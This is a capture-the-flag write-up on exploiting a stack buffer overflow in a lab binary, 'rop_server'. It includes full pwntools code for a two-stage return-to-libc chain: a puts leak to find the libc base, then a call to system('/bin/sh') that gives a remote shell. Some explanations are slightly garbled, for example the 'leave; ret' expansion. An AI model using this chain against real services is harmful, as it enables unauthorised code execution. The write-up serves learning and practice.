# ROP Challenge 

	Provided with a libc binary and a binary file


Checking the security enabled on the binary during copilation

![Screenshot 2024-10-28 104653](https://github.com/user-attachments/assets/f0326a52-928e-4922-ba15-2bfd016bd329)


This shows that there’s no stack canary, the stack is non-executable, and there’s no PIE enabled, so ASLR won’t be an issue when working with this binary.

Continuing with the binary analysis, I ran it to observe its behavior. It repeatedly prompts for an address, suggesting a while loop and an expected input.

![Screenshot 2024-10-28 105354](https://github.com/user-attachments/assets/01a75f7d-8e0b-44ef-9993-09e671eb9056)


Using GDB, I proceeded to disassemble the main function, as the binary is not stripped.

![Screenshot 2024-10-28 110023](https://github.com/user-attachments/assets/45d999b9-1124-48b8-8fa7-3cbe41c97362)

We can see that the binary sets up a TCP socket and waits for incoming connection requests. This, however, interferes with analyzing the challenge directly. To work around it, I wrote a quick GDB script to allow the function frame to initialize, then bypass the entire socket connection setup.


```
b *main+221

r < ola

set $rip=*main+356
c

```


# Checking Buffer Overflow

supplying a really long input to the binary makes our input overflow the intended buffer assigned for the input into other memory space including rbp and the return address (good thing there is no stack canary). If there is a stack canary we would have had to look a way to leak the canary or bruteforce, since its a fork server.

one of the easiest way to determine where the buffer overflows into the return pointer is to send in a cyclic pattern and check the rsp when it segfaults

![Screenshot 2024-10-28 111601](https://github.com/user-attachments/assets/cbf7a712-452f-4ce4-8580-5b98703b0a36)

# Overflowing the return pointer

Remember *ret* instruction is ? .... it means pop rip , this means the value in rsp at the time of this instruction will end up in rip ; This will serve as the basic of our ROP attack
By calculating the pattern than ends up in the rsp when the binary segfaults we can easily calculate the offset we need to get to the return pointer 
![binary-overflow](https://github.com/user-attachments/assets/88d643bb-577a-4298-b153-8fb8952a1d42)



# Where to return to ?

Now that we control the return address , we can move anywhere in the binary by chaining ROP gadgets but first, lets map out a plan .....

The plan is to get this program to give us a shell access

How do we do that ? 

with the control we have over the stack , we can patch up a ROP chain that indirectly tells the program what to do by carefully pointing a path from one instruction to the next


If I can carefully trigger a syscall in the program and set the arguments correctly, I can make the program execute a shell.

However, checking for syscalls in the binary came up empty-handed, not that I expected it to be that easy, but it's always worth a shot, right? 
![Screenshot 2024-10-28 112832](https://github.com/user-attachments/assets/5cced1c6-1adf-45ab-a869-6c995f9e7773)

This isn’t the end, though!


# Return to libc 

That doesn’t stop our exploit, though. We have plenty of return points available, thanks to libc, which is dynamically linked to our binary.

Since we’re provided with the specific libc version used by this binary, it’s crucial to use it for our exploit to avoid any potential discrepancies in offsets


### leaking the address of libc 

To use gadgets in libc, we need to determine the base address of libc at runtime. Since PIE is enabled for all linked libraries, we’ll have to contend with ASLR.

A reliable way to leak the libc address is by using the program’s puts function (via the PLT) to print the puts address in libc (from the GOT).

You can read more about PLT and GOT here...


 ### making our program run puts(puts)

 -  first, we have to find the puts@got and puts@plt

 - then we set the argument to the puts@plt to puts@got ;

 - setting argument of puts@plt means we have to sets its rdi therefore we have to find the gadget that sets rdi.

![image](https://github.com/user-attachments/assets/1e46192f-0296-4c27-8d8b-87de96b84bdf)

  
  `pop rdi; ret` suits our purpose perfectly. remember we control the stack, hence we control was will be poped into rdi

  
  So Let's go over our exploit again

  - we control return pointer; and we point it to pop rdi
  - we set the stack to the value we want in rdi ; puts@got 
  - once pop rdi returns it gets return address from rsp which we control; where puts@plt awaits
  - the instance puts@plt is called , its argument (rdi), will already contain libc puts address , hence leaking our libc address of puts
  - then we restart the binary by setting the next ret's rsp as the *main*'s address
  
  once we restart the binary to read in new input for our second payload


Building our exploit to this point


```python
from pwn import *

# context.log_level = 'debug'

offset = b"A" * 72 

rop = ELF("./rop_server")

pop_rdi = p64(0x4011f7) # our rdi gadget 
puts_got = p64(rop.got['puts'])   # puts@got
puts_plt = p64(rop.plt['puts'])   # puts@plt
main_func = p64(0x401395)


print(hex(rop.got['puts']))
print(hex(rop.plt['puts']))



payload = offset + pop_rdi + puts_got + puts_plt + main_func
```

This will send in 72 bytes of 'A's to fill the buffer end everything until the return address, then it will replace the return address with the address of pop_rdi, it continues by filling the next 8 bytes with the value we want in rdi, then the next 8 bytes with the address we want to run after pop_rdi returns, and finally the address of the main function so that the binary restarts .

This chain is facinating right, i follow it by explicitly following and  replacing *leave;ret* with its equivalent instructions

```asm
# leave; ret
mov rsp, rbp
pop rbp;
pop rdi;
```

Now that we have the main address of puts in libc, we can calculate the base address of libc by subtracting the static offset of puts within the libc binary



## Second stage Attack

	calling system("/bin/sh")

With the base address of `libc` established, we can now navigate within `libc` without worrying about ASLR.

Remember, in an `x86_64` function call, the first argument is passed in `rdi`. To call our `system` function, we need to set `rdi` to point to a valid shell string.

In our case, we want to execute a shell. We can achieve this by locating the string `"/bin/sh"` within the `libc` binary and using its address.


```
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

After getting this address we can factor in the libc base address and chain our ROP as follows

- The offset to fill the buffer and anything up until the return address
- the address of pop_rdi to set the argument to our system function
- The value we want rdi to retain `"/bin/sh"` (argument for system)
- Then the address of sytem


```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print(hex(libc.symbols['puts']))
proc = remote('0.0.0.0', '3001')

proc.writeafter("What is my address?\n", payload + b"\n")

proc.recv(2); #receive \n after 

libc_puts = u64(proc.recv(6).ljust(8, b'\x00'))


print(hex(libc_puts))
print(hex(libc_puts - libc.symbols['puts']))


address = libc_puts - libc.symbols['puts']

libc.address = address


binsh_addr = p64(address + 0x197e34)


system = p64(libc.symbols['system'])

payload2 = offset + pop_rdi + binsh_addr + system

payload2 += p64(libc.symbols['exit']) 

print(payload2)

proc.writeafter("What is my address?\n", payload2 + b"\n")


proc.interactive()
```



## SHELL !
![image](https://github.com/user-attachments/assets/7cbeccf3-f8d9-4461-b6a0-708ae5efc9a8)


